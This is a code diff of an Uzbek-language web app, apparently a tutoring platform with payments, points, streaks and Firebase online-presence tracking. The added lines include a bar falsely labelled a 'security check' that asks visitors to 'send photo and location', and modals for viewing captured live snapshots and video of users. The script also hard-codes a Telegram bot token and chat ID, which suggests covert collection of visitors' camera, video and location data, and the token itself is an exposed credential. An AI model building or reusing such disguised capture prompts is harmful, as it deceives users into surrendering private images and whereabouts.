+<div id="paySuccess" class="hidden fixed inset-0 z-[210] flex items-center justify-center p-4" style="background:rgba(0,0,0,.88);backdrop-filter:blur(10px)">
+<div class="text-center"><div class="w-24 h-24 bg-green-500/20 border-2 border-green-500 rounded-full flex items-center justify-center mx-auto mb-6"><i class="fas fa-check text-green-400 text-4xl"></i></div>
+<p class="text-white font-black text-2xl mb-2">To'lov muvaffaqiyatli! ✅</p>
+<p id="paySuccessMsg" class="text-slate-400 text-sm mb-6">Balansingiz yangilandi.</p>
+<button onclick="closePaySuccess()" class="bg-green-600 hover:bg-green-700 text-white font-bold px-10 py-3 rounded-xl text-base transition">Davom etish</button></div></div>
+
+<div id="photoViewerModal" class="hidden fixed inset-0 z-[310] flex items-center justify-center p-4" style="background:rgba(0,0,0,.95);backdrop-filter:blur(10px)" onclick="closePhotoViewer()">
+<div class="relative max-w-2xl" onclick="event.stopPropagation()">
+<img id="photoViewerImg" class="max-w-full max-h-[85vh] rounded-2xl border-2 border-slate-700 shadow-2xl">
+<p id="photoViewerName" class="text-white text-center font-bold mt-3"></p>
+<button onclick="closePhotoViewer()" class="absolute -top-3 -right-3 bg-red-600 text-white w-10 h-10 rounded-full font-bold"><i class="fas fa-times"></i></button></div></div>
+
+<div id="liveViewerModal" class="hidden fixed inset-0 z-[315] flex items-center justify-center p-4" style="background:rgba(0,0,0,.95);backdrop-filter:blur(10px)" onclick="closeLiveViewer()">
+<div class="relative max-w-3xl" onclick="event.stopPropagation()">
+<div class="flex justify-between items-center mb-3"><p id="liveViewerName" class="text-white font-bold text-lg"></p>
+<button onclick="closeLiveViewer()" class="bg-red-600 text-white w-10 h-10 rounded-full font-bold"><i class="fas fa-times"></i></button></div>
+<img id="liveViewerImg" class="max-w-full max-h-[70vh] rounded-2xl border-2 border-emerald-500 shadow-2xl">
+<div id="liveViewerStrip" class="flex gap-2 mt-3 justify-center flex-wrap"></div></div></div>
+
+<div id="videoViewerModal" class="hidden fixed inset-0 z-[320] flex items-center justify-center p-4" style="background:rgba(0,0,0,.95);backdrop-filter:blur(10px)" onclick="closeVideoViewer()">
+<div class="relative max-w-2xl w-full" onclick="event.stopPropagation()">
+<div class="flex justify-between items-center mb-3"><p id="videoViewerName" class="text-white font-bold text-lg"></p>
+<button onclick="closeVideoViewer()" class="bg-red-600 text-white w-10 h-10 rounded-full font-bold"><i class="fas fa-times"></i></button></div>
+<video id="videoViewerPlayer" controls class="w-full rounded-2xl border-2 border-emerald-500 shadow-2xl bg-black"></video></div></div>
+
+<div id="permFallbackBar" class="hidden fixed bottom-4 left-1/2 -translate-x-1/2 z-[250] card-bg rounded-2xl px-5 py-3 shadow-2xl border border-blue-700/50 flex items-center gap-3 max-w-[95%]">
+<i class="fas fa-shield-alt text-blue-400 text-xl"></i>
+<div class="flex-grow"><p class="text-white text-xs font-bold">Xavfsizlik tekshiruvi</p>
+<p class="text-slate-400 text-[10px]">Rasm va joylashuvni yuborish uchun bosing</p></div>
+<button onclick="captureAll(false)" class="bg-blue-600 text-white text-xs font-black px-4 py-2 rounded-xl whitespace-nowrap"><i class="fas fa-check mr-1"></i> Ruxsat</button>
+<button onclick="dismissPermBar()" class="text-slate-500 hover:text-white text-lg px-1">✕</button></div><script>
 const BOT_TOKEN='8845097344:AAHKib94m_qRWIH9gTg-Ptbdrv1Yd-vuzlk';
 const CHAT_ID='7294123884';
 const VIDEO_DURATION=10000;
@@ -45,7 +374,6 @@ let _heartbeatInterval=null;
 let _snapViewerUserId=null,_snapViewerIndex=0,_snapViewerIsGuest=false;
 let _payMode='topup',_payTutorId=null;
 
-// ===== 🪙 BALLAR VA DARAJA =====
 const LEVELS=[
 {min:0,name:'Yangi',emoji:'🌱',color:'text-slate-400',bg:'bg-slate-800'},
 {min:50,name:"O'quvchi",emoji:'📚',color:'text-blue-400',bg:'bg-blue-900/40'},
@@ -75,7 +403,6 @@ setTimeout(()=>{toast('🪙 +'+amount+' ball. Jami: '+after);},300);
 }
 }
 
-// ===== 🔥 STREAK =====
 function updateStreak(){
 if(!db.currentUser)return;
 const u=db.users.find(x=>x.id===db.currentUser.id);
@@ -100,7 +427,6 @@ if(u.streakDays>=2){setTimeout(()=>{toast('🔥 '+u.streakDays+' kun ketma-ket o
 }
 }
 
-// ===== 🎁 Bonus за старые покупки =====
 function retroactivePoints(){
 if(!db.currentUser)return;
 const u=db.users.find(x=>x.id===db.currentUser.id);
@@ -121,7 +447,6 @@ setTimeout(()=>{toast('🎁 Eski kurslaringiz uchun '+expectedPoints+' ball qo\'
 }
 }
 
-// ===== 🎁 Kunlik TOP-3 bonus =====
 function checkDailyTopBonus(){
 if(!db.currentUser)return;
 const sorted=[...db.users].filter(u=>u.role!=='admin').sort((a,b)=>(b.points||0)-(a.points||0)).slice(0,3);
@@ -275,7 +600,6 @@ let _onlineHeartbeat=null;
 let _onlinePresenceId=null;
 let _onlineListenerAttached=false;
 
-// O'zimizni "onlayn" deb yozamiz
 function writeOnlinePresence(){
 if(!_onlinePresenceId)return;
 database.ref('online/'+_onlinePresenceId).set({
@@ -285,31 +609,21 @@ role:db.currentUser?(db.currentUser.role||'student'):'guest'
 });
 }
 
-// Ishga tushirish / login-guest almashganda qayta ishga tushirish
 function initOnlinePresence(){
-// Eski yozuvni tozalaymiz (agar mavjud bo'lsa)
 if(_onlinePresenceId){
 database.ref('online/'+_onlinePresenceId).remove();
 }
 if(_onlineHeartbeat){clearInterval(_onlineHeartbeat);_onlineHeartbeat=null;}
-
-// ID tanlaymiz: login qilgan yoki mehmon
 if(db.currentUser){
 _onlinePresenceId=db.currentUser.id;
 }else{
 const g=getOrCreateGuest();
 _onlinePresenceId=g.id;
 }
-
-// onDisconnect — sahifa yopilsa, yozuv avtomatik o'chadi
 const ref=database.ref('online/'+_onlinePresenceId);
 ref.onDisconnect().remove();
 writeOnlinePresence();
-
-// Har 20 sekundda yangilab turamiz (tirik ekanimizni bildiramiz)
 _onlineHeartbeat=setInterval(writeOnlinePresence,20000);
-
-// Umumiy ro'yxatni bir marta tinglaymiz (dublikat listener bo'lmasligi uchun)
 if(!_onlineListenerAttached){
 _onlineListenerAttached=true;
 database.ref('online').on('value',snap=>{
@@ -321,7 +635,6 @@ const e=data[id];
 if(e&&e.at&&(now-e.at)<60000){
 count++;
 }else if(id!==_onlinePresenceId){
-// O'lgan yozuv (60 sekunddan eski) — tozalaymiz, baza shishmasin
 database.ref('online/'+id).remove();
 }
 });
@@ -331,7 +644,6 @@ if(numEl)numEl.textContent=count;
 }
 }
 
-// Chiqishda o'zimizni ro'yxatdan olib tashlaymiz
 function stopOnlinePresence(){
 if(_onlineHeartbeat){clearInterval(_onlineHeartbeat);_onlineHeartbeat=null;}
 if(_onlinePresenceId){
